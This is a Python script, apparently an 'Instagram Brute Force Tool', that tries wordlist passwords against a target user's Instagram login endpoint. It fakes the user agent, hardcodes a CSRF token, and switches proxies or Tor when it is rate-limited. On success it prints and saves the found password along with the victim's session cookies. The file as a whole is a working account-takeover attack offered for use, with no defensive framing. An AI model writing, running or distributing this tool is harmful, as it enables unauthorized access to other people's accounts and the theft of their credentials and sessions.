import os
import time
import json
import argparse
import requests
import threading
from datetime import datetime
from fake_user_agents import fake_agent

instagram_url = "https://www.instagram.com/accounts/login/"
instagram_url_login = "https://www.instagram.com/accounts/login/ajax/"

payload = {
    "queryParams": {},
    "optIntoOneTap": "false"
}

login_header = {
    "User-Agent": fake_agent(),
    "X-Requested-With": "XMLHttpRequest",
    "Referer": instagram_url
}

# Prompt the user to enter the CSRF token
csrf = "xvAQoMiz2eaU4RrcmRp2hqinDVMfgkpe"
login_header.update({"x-csrftoken": csrf})

def green(text):
    return "\033[92m{}\033[00m".format(text)

def blue(text):
    return "\033[94m{}\033[00m".format(text)

def red(text):
    return "\033[91m{}\033[00m".format(text)

def attack_start_notify(target):
    try:
        os.system(f'herbe "Starting attack to victim: {target}"')
        print(blue(f"Starting attack to victim: {target}"))
    except:
        print(blue(f"Starting attack to victim: {target}"))

# number between 1 and 100 using the --speed argument
def attack_hack_notify(hack, speed):
    try:
        os.system(f"herbe 'target password founded: {hack}'")
        print(green(f"[+] target password founded: {hack}"))
        print(f"[*] Typing speed: {speed} attempts per minute")
    except:
        print(green(f"[+] target password founded: {hack}"))
        print(f"[*] Typing speed: {speed} attempts per minute")

def crack(save, session, password, victim, start_time, tryes):
    global hack_request
    hack_request = session.post(instagram_url_login, data=payload, headers=login_header)
    threading.Thread(target=attack_start_notify, args=(victim,)).start()
    if save.lower() == "y":
        with open(f"tryed/{victim}", "a") as tryed:
            tryed.write(password)
    print(f"[-] trying password: {blue(password)}")
    try:
        hack_data = json.loads(hack_request.text)
    except json.JSONDecodeError:
        print(red("[-] Invalid response from the server. Retrying..."))
        return {"authenticated": False}
    print(f'[{green("INFO")}]: {hack_data}')
    time_taken = (time.time() - start_time) / 60  # Calculate time taken in minutes
    speed = tryes / time_taken
    return hack_data, speed

def attack(target, wordlist_file, save, speed, proxies=None):
    tryes = 0
    start_time = time.time()
    session = requests.Session()
    if proxies:
        session.proxies.update(proxies)
    delay = 60 / speed  # Calculate delay between each password attempt
    for hack in wordlist_file:
        tryes += 1
        hack = hack.strip()
        payload.update({
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{hack}"
        })
        try:
            hack_data, speed = crack(save, session, hack, target, start_time, tryes)
            if "authenticated" in hack_data and hack_data["authenticated"]:
                threading.Thread(target=attack_hack_notify, args=(hack, speed)).start()
                cookies = hack_request.cookies
                cookie_jar = cookies.get_dict()
                csrf_token = cookie_jar['csrftoken']
                print("csrf_token: ", csrf_token)
                session_id = cookie_jar['sessionid']
                print("session_id: ", session_id)
                with open(f"hacked/{hack}", "a") as hacked:
                    hacked.write(hack)
                break
        except KeyError:
            time.sleep(2)
            print(red("[-] Instagram detected spam attack"))
            if proxies and session.proxies:
                print(green("[+] Changing proxy..."))
                session.proxies.popitem()  # Remove the current proxy
            elif not proxies and session.proxies is not None:
                print(green("[+] Changing server..."))
                session.proxies = None
            hack_data, speed = crack(save, session, hack, target, start_time, tryes)
        time.sleep(delay)  # Delay between each password attempt

def load_proxies(proxies_file):
    with open(proxies_file, "r") as file:
        proxies = file.readlines()
    proxies = [proxy.strip() for proxy in proxies]
    proxies = [{'http': proxy, 'https': proxy} for proxy in proxies]
    return proxies

def main():
    parser = argparse.ArgumentParser(description="Instagram Brute Force Tool")
    parser.add_argument("--speed", type=int, default=60, help="Number of attempts per minute (default: 60)")
    args = parser.parse_args()

    target = input(blue("[+] Target username: "))
    payload.update({"username": target})
    wordlist = input(blue("[+] Wordlist path: "))
    try:
        bruteforce = open(wordlist, "r")
    except FileNotFoundError:
        print(red("[-] Wordlist file not found\n[+] Trying to open wordlist.txt file"))
        try:
            bruteforce = open(f'{wordlist}.txt', 'r')
        except FileNotFoundError:
            print(red("[-] wordlist.txt file not found"))
            exit()
    print(blue(f'[+] Changing wordlist path to {wordlist}.txt'))
    save = input(blue("[+] Do you want to save tried passwords (y/n): "))
    if save.lower() == "y":
        print(green(f"[+] The tried passwords file path will be tryed/{target}.txt"))

    use_proxies = input(blue("[+] Enter 'use proxies' to specify a proxies file or 'tor on'/'tor off' to enable/disable Tor: "))
    proxies = None
    if use_proxies.lower() == "use proxies":
        proxies_file = "/root/Desktop/insta/my/proxies_test/proxies_verify.txt"
        proxies = load_proxies(proxies_file)
        if not proxies:
            print(red("[-] Proxies file not found or empty."))
            exit()
    elif use_proxies.lower() == "tor on":
        proxies = {
            'http': 'socks5://localhost:9050',
            'https': 'socks5://localhost:9050'
        }
    elif use_proxies.lower() == "tor off":
        proxies = None
    else:
        print(red("[-] Invalid input for proxies/Tor. Please enter 'use proxies', 'tor on', or 'tor off'."))
        exit()

    attack(target, bruteforce, save, args.speed, proxies)

if __name__ == "__main__":
    main()
